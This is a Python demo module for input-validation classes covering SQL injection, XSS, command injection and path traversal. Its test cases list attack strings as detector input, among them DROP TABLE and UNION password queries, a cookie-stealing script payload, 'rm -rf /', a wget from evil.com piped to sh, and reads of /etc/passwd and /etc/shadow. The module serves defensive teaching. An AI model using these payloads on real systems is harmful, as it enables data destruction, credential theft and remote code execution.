"""
03 Input Validation: Demos
"""

from ._types import *

def demo_sql_injection():
    """Demonstrate SQL injection detection and prevention."""
    print("\n" + "=" * 72)
    print("DEMO 1: SQL Injection Prevention")
    print("=" * 72)

    validator = SQLInjectionValidator()
    test_cases = [
        ("SELECT * FROM users WHERE id = 1", "Classic SELECT injection"),
        ("'; DROP TABLE users; --", "Classic DROP injection"),
        ("1' OR '1'='1", "OR-based blind injection"),
        ("1 UNION SELECT username, password FROM admin", "UNION-based injection"),
        ("1; WAITFOR DELAY '0:0:5' --", "Time-based blind injection"),
        ("Find products under $50", "Safe input"),
        ("Hello, how are you?", "Safe input"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = (
            "BLOCKED"
            if result.should_reject
            else ("WARN" if result.threat_level != ThreatLevel.SAFE else "SAFE")
        )
        print(f"\n  [{status}] {description}")
        print(f'  Input: "{text[:60]}{"..." if len(text) > 60 else ""}"')
        print(f"  Threat: {result.threat_level.name} | Valid: {result.is_valid}")
        if result.details.get("threats"):
            print(f"  Threats: {', '.join(result.details['threats'])}")

    # Show parameterized query creation
    print("\n  Parameterized Query Example:")
    template = "SELECT * FROM users WHERE name = :name AND age = :age"
    params = {"name": "John'; DROP TABLE users; --", "age": 25}
    safe_query, values = SQLInjectionValidator.create_parameterized_query(
        template, params
    )
    print(f"  Template: {template}")
    print(f"  Safe query: {safe_query}")
    print(f"  Values: {values}")


def demo_xss_prevention():
    """Demonstrate XSS detection and prevention."""
    print("\n" + "=" * 72)
    print("DEMO 2: XSS Prevention")
    print("=" * 72)

    validator = XSSValidator()
    test_cases = [
        ('<script>alert("XSS")</script>', "Script tag injection"),
        ('<img src=x onerror="alert(1)">', "Event handler injection"),
        ("javascript:alert(document.cookie)", "JavaScript URI"),
        ('<div style="background:url(javascript:alert(1))">', "CSS injection"),
        ("<b>Bold text</b> and <i>italic</i>", "Safe HTML"),
        ("Hello, this is plain text.", "Safe plain text"),
        ("&#60;script&#62;alert(1)&#60;/script&#62;", "HTML entity encoded XSS"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = (
            "BLOCKED"
            if result.should_reject
            else ("WARN" if result.threat_level != ThreatLevel.SAFE else "SAFE")
        )
        print(f"\n  [{status}] {description}")
        print(f'  Input: "{text[:60]}{"..." if len(text) > 60 else ""}"')
        print(f"  Threat: {result.threat_level.name} | Valid: {result.is_valid}")
        if result.sanitized_output:
            print(
                f'  Sanitized: "{result.sanitized_output[:60]}{"..." if len(result.sanitized_output) > 60 else ""}"'
            )


def demo_command_injection():
    """Demonstrate command injection detection and prevention."""
    print("\n" + "=" * 72)
    print("DEMO 3: Command Injection Prevention")
    print("=" * 72)

    validator = CommandInjectionValidator()
    test_cases = [
        ("ls -la /home", "Safe file listing"),
        ("python script.py --arg value", "Safe Python command"),
        ("ls; rm -rf /", "Chained dangerous command"),
        ("cat file.txt | bash", "Pipe to shell"),
        ("`whoami`", "Backtick command substitution"),
        ("$(cat /etc/passwd)", "Dollar-paren substitution"),
        ("wget http://evil.com/malware.sh | sh", "Remote code execution"),
        ("echo hello > /dev/null", "Safe redirect"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = (
            "BLOCKED"
            if result.should_reject
            else ("WARN" if result.threat_level != ThreatLevel.SAFE else "SAFE")
        )
        print(f"\n  [{status}] {description}")
        print(f'  Input: "{text}"')
        print(f"  Threat: {result.threat_level.name} | Valid: {result.is_valid}")
        if result.details.get("threats"):
            print(f"  Threats: {', '.join(result.details['threats'])}")

    # Show safe command building
    print("\n  Safe Command Building:")
    safe_cmd = CommandInjectionValidator.build_safe_command(
        "python", ["script.py", "arg with spaces", "arg'with'quotes"]
    )
    print(f"  Safe command: {safe_cmd}")


def demo_path_traversal():
    """Demonstrate path traversal detection and prevention."""
    print("\n" + "=" * 72)
    print("DEMO 4: Path Traversal Prevention")
    print("=" * 72)

    validator = PathTraversalValidator(allowed_base_dirs=["/tmp/uploads", "/var/data"])
    test_cases = [
        ("file.txt", "Simple filename"),
        ("subdir/file.txt", "Nested file"),
        ("../../../etc/passwd", "Directory traversal"),
        ("uploads/../../../etc/shadow", "Traversal from subdirectory"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL-encoded traversal"),
        ("/tmp/uploads/file.txt", "Absolute path (allowed)"),
        ("/etc/passwd", "Absolute path (not allowed)"),
        ("file.txt\x00.jpg", "Null byte injection"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = (
            "BLOCKED"
            if result.should_reject
            else ("WARN" if result.threat_level != ThreatLevel.SAFE else "SAFE")
        )
        print(f"\n  [{status}] {description}")
        print(f'  Input: "{text}"')
        print(f"  Threat: {result.threat_level.name} | Valid: {result.is_valid}")


def demo_constraint_validation():
    """Demonstrate constraint-based validation."""
    print("\n" + "=" * 72)
    print("DEMO 5: Input Constraint Validation")
    print("=" * 72)

    # Custom constraints
    constraints = InputConstraints(
        max_length=200,
        min_length=5,
        max_line_count=10,
        max_word_count=50,
        allow_null_bytes=False,
        allow_control_chars=False,
    )
    validator = ConstraintValidator(constraints)

    test_cases = [
        ("Hello, this is a valid input.", "Valid input"),
        ("Hi", "Too short"),
        ("A" * 300, "Too long"),
        ("line1\n" * 15, "Too many lines"),
        ("word " * 60, "Too many words"),
        ("Hello\x00World", "Null byte"),
        ("Hello\x01World", "Control character"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = "BLOCKED" if not result.is_valid else "VALID"
        print(f"\n  [{status}] {description}")
        print(f"  Input length: {len(text)} | Threat: {result.threat_level.name}")
        if result.details.get("violations"):
            for v in result.details["violations"][:2]:
                print(f"    - {v}")


def demo_pipeline():
    """Demonstrate the complete validation pipeline."""
    print("\n" + "=" * 72)
    print("DEMO 6: Complete Validation Pipeline")
    print("=" * 72)

    pipeline = ValidationPipeline(
        {
            "constraints": InputConstraints(max_length=5000),
            "allowed_dirs": ["/tmp/uploads"],
        }
    )

    test_cases = [
        ("Hello, how can I help you?", None, "Normal user message"),
        ("'; DROP TABLE users; --", "database_query", "SQL injection in DB query"),
        ('<script>alert("XSS")</script>', "html_content", "XSS in HTML content"),
        ("ls; rm -rf /", "shell_command", "Command injection"),
        ("../../../etc/passwd", "file_path", "Path traversal"),
    ]

    for text, context, description in test_cases:
        results = pipeline.validate(text, context=context)
        any_threats = any(r.threat_level != ThreatLevel.SAFE for r in results.values())
        status = "THREATS" if any_threats else "CLEAN"
        print(f"\n  [{status}] {description}")
        print(f"  Context: {context or 'general'}")
        print(f"  Validators run: {list(results.keys())}")
        for name, result in results.items():
            if result.threat_level != ThreatLevel.SAFE:
                print(f"    {name}: {result.threat_level.name} - {result.message}")

    # Show validation log
    print(f"\n  Validation Log ({len(pipeline.validation_log)} entries):")
    for entry in pipeline.validation_log[-3:]:
        print(
            f"    Hash: {entry['input_hash']} | Valid: {entry['valid']} | Max Threat: {entry['max_threat']}"
        )


# =============================================================================
# Section 9: Best Practices
# =============================================================================

